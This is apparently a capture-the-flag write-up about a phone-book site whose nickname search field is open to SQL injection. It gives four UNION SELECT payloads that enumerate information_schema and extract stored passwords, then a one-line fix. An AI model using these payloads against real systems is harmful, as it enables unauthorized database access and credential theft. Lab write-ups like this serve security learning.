hackers
==============

Overview
--------
A website gives access to telephone numbers of people and also has a restricted area where access should only be granted with a correct password.

Vulnerability
-------------
The server is vulnerable to SQL injections with the form field for searching nick names in the telephone book. This can be used to access the information_schema database of mysql and to get the information we need (table names, column names) in order for the final sql injection query to return our password for the flag.

Exploitation
------------
We need a few queries. (We always union select 4 columns as this is necessary in this case.)

* 1' AND 1=2 UNION SELECT table_schema AS name, table_name AS surname, TABLE_TYPE AS nick, 1 AS telephone FROM information_schema.tables WHERE table_name LIKE '%book%

to get the table name and schema name (database name) of our working set. (hackrzpasswdz, hackers)

* 1' AND 1=2 UNION SELECT table_schema AS name, table_name AS surname, TABLE_TYPE AS nick, 1 AS telephone FROM information_schema.tables WHERE table_schema LIKE '%hackers%' AND table_name != 'hackerztelbookz

get the table with the password information (hackrzpasswdz)

* 1' AND 1=2 UNION SELECT COLUMN_NAME, 1, 1, 1 FROM information_schema.columns WHERE table_schema='hackers' AND table_name='hackrzpasswdz' AND COLUMN_NAME != 'id' AND COLUMN_NAME != 'hacker_id

column information for hackrzpasswdz

* 1' AND 1=2 UNION SELECT hacker_id, secretpaswd, 1, 1 FROM hackers.hackrzpasswdz WHERE hacker_id != '6

our password (second try without id 6)

Solution
--------
Escape the user input query.
